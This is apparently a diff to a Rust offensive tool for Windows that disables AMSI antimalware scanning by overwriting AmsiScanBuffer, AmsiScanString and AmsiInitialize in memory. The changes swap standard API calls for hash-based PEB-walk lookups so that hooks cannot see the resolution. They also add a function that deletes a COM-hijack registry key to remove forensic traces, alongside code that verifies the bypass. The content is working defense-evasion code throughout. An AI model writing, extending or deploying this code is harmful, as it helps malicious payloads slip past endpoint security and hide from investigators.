@@ -21,27 +21,32 @@ pub fn orchestrate_layers() -> bool { true }
 /// Patch AmsiScanBuffer in-process with `xor eax,eax; ret` to force AMSI_RESULT_CLEAN.
 #[cfg(windows)]
 fn apply_memory_patch() {
-    use winapi::um::libloaderapi::{GetModuleHandleW, GetProcAddress, LoadLibraryW};
     use winapi::um::memoryapi::VirtualProtect;
     use winapi::um::winnt::{PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_READ};
 
     unsafe {
-        // Ensure amsi.dll is loaded
-        let amsi_wide: Vec<u16> = "amsi.dll\0".encode_utf16().collect();
-        let mut hmod = GetModuleHandleW(amsi_wide.as_ptr());
-        if hmod.is_null() {
-            hmod = LoadLibraryW(amsi_wide.as_ptr());
-        }
-        if hmod.is_null() {
-            log::warn!("apply_memory_patch: amsi.dll not loaded");
-            return;
-        }
+        // Use pe_resolve (PEB walk + hash) to avoid IAT-hookable GetModuleHandleW.
+        // If amsi.dll is not already loaded, AMSI is not active and there is
+        // nothing to patch.
+        let amsi_hash = pe_resolve::hash_str(b"amsi.dll\0");
+        let hmod_base = match pe_resolve::get_module_handle_by_hash(amsi_hash) {
+            Some(b) => b as winapi::shared::minwindef::HMODULE,
+            None => {
+                log::debug!("apply_memory_patch: amsi.dll not loaded — nothing to patch");
+                return;
+            }
+        };
+        let hmod = hmod_base as *mut winapi::ctypes::c_void;
 
-        let scan_buf = GetProcAddress(hmod, b"AmsiScanBuffer\0".as_ptr() as _);
-        if scan_buf.is_null() {
-            log::warn!("apply_memory_patch: AmsiScanBuffer not found");
-            return;
-        }
+        // Resolve AmsiScanBuffer via hash
+        let scan_buf_hash = pe_resolve::hash_str(b"AmsiScanBuffer\0");
+        let scan_buf = match pe_resolve::get_proc_address_by_hash(hmod_base as usize, scan_buf_hash) {
+            Some(addr) => addr as *mut winapi::ctypes::c_void,
+            None => {
+                log::warn!("apply_memory_patch: AmsiScanBuffer not found");
+                return;
+            }
+        };
 
         // xor eax, eax (0x31 0xC0) ; ret (0xC3)
         let patch: [u8; 3] = [0x31, 0xC0, 0xC3];
@@ -64,14 +69,16 @@ fn apply_memory_patch() {
         }
 
         // Also patch AmsiScanString
-        let scan_str = GetProcAddress(hmod, b"AmsiScanString\0".as_ptr() as _);
-        if !scan_str.is_null() {
+        let scan_str_hash = pe_resolve::hash_str(b"AmsiScanString\0");
+        if let Some(scan_str_addr) = pe_resolve::get_proc_address_by_hash(hmod_base as usize, scan_str_hash) {
+            let scan_str = scan_str_addr as *mut winapi::ctypes::c_void;
             let mut op: u32 = 0;
             if VirtualProtect(scan_str as _, patch.len(), PAGE_EXECUTE_READWRITE, &mut op) != 0 {
                 std::ptr::copy_nonoverlapping(patch.as_ptr(), scan_str as *mut u8, patch.len());
                 VirtualProtect(scan_str as _, patch.len(), op, &mut op);
             }
         }
+        let _ = hmod;
     }
 }
 
@@ -110,28 +117,42 @@ fn apply_com_hijack() {
     }
 }
 
+/// Remove the registry key created by `apply_com_hijack` to avoid leaving a
+/// detectable COM-hijack artefact after the bypass is no longer needed.
+#[cfg(windows)]
+pub fn cleanup_com_hijack() {
+    use winapi::um::winreg::{RegDeleteKeyA, HKEY_CURRENT_USER};
+    // Delete leaf key first; parent keys are harmless to leave (they are empty
+    // standard Windows registry nodes).
+    let leaf = b"Software\\Classes\\CLSID\\{FDB00E1A-552D-4F68-A8B3-EE9016CBA552}\\InprocServer32\0";
+    let parent = b"Software\\Classes\\CLSID\\{FDB00E1A-552D-4F68-A8B3-EE9016CBA552}\0";
+    unsafe {
+        RegDeleteKeyA(HKEY_CURRENT_USER, leaf.as_ptr() as _);
+        RegDeleteKeyA(HKEY_CURRENT_USER, parent.as_ptr() as _);
+    }
+}
+
 /// Set the g_AmsiContext initialization flag to indicate failure so any
 /// AmsiInitialize call in the current process reports an error.
 #[cfg(windows)]
 fn set_init_failed_flag() {
-    use winapi::um::libloaderapi::{GetModuleHandleW, GetProcAddress};
     use winapi::um::memoryapi::VirtualProtect;
-    use winapi::um::winnt::PAGE_READWRITE;
 
     unsafe {
-        let amsi_wide: Vec<u16> = "amsi.dll\0".encode_utf16().collect();
-        let hmod = GetModuleHandleW(amsi_wide.as_ptr());
-        if hmod.is_null() {
-            return;
-        }
+        let amsi_hash = pe_resolve::hash_str(b"amsi.dll\0");
+        let hmod_base = match pe_resolve::get_module_handle_by_hash(amsi_hash) {
+            Some(b) => b,
+            None => return,
+        };
 
         // AmsiInitialize is __fastcall on x64; the caller cleans the stack so
         // a single-byte RET (0xC3) is the correct return form.
         // mov eax, 0x80004005 ; ret  => B8 05 40 00 80 C3
-        let init_fn = GetProcAddress(hmod, b"AmsiInitialize\0".as_ptr() as _);
-        if init_fn.is_null() {
-            return;
-        }
+        let init_hash = pe_resolve::hash_str(b"AmsiInitialize\0");
+        let init_fn = match pe_resolve::get_proc_address_by_hash(hmod_base, init_hash) {
+            Some(addr) => addr as *mut winapi::ctypes::c_void,
+            None => return,
+        };
 
         let patch: [u8; 6] = [
             0xB8, 0x05, 0x40, 0x00, 0x80, // mov eax, 0x80004005 (E_FAIL)
@@ -149,23 +170,21 @@ fn set_init_failed_flag() {
 /// Verify AMSI bypass by checking that AmsiScanBuffer starts with our patch bytes.
 #[cfg(windows)]
 pub fn verify_bypass() -> bool {
-    use winapi::um::libloaderapi::{GetModuleHandleW, GetProcAddress};
-
     unsafe {
-        let amsi_wide: Vec<u16> = "amsi.dll\0".encode_utf16().collect();
-        let hmod = GetModuleHandleW(amsi_wide.as_ptr());
-        if hmod.is_null() {
-            // amsi.dll not loaded = AMSI not active = bypass trivially successful
-            return true;
-        }
+        let amsi_hash = pe_resolve::hash_str(b"amsi.dll\0");
+        let hmod_base = match pe_resolve::get_module_handle_by_hash(amsi_hash) {
+            Some(b) => b,
+            None => return true, // amsi.dll not loaded = bypass trivially successful
+        };
 
-        let scan_buf = GetProcAddress(hmod, b"AmsiScanBuffer\0".as_ptr() as _);
-        if scan_buf.is_null() {
-            return true;
-        }
+        let scan_buf_hash = pe_resolve::hash_str(b"AmsiScanBuffer\0");
+        let scan_buf = match pe_resolve::get_proc_address_by_hash(hmod_base, scan_buf_hash) {
+            Some(addr) => addr as *const u8,
+            None => return true,
+        };
 
         // Read 5 bytes so we can check the full mov eax,imm32 + ret form.
-        let bytes = std::slice::from_raw_parts(scan_buf as *const u8, 5);
+        let bytes = std::slice::from_raw_parts(scan_buf, 5);
         // Patched forms:
         //   31 C0 C3                 (xor eax,eax ; ret)
         //   33 C0 C3                 (xor eax,eax alt encoding ; ret)
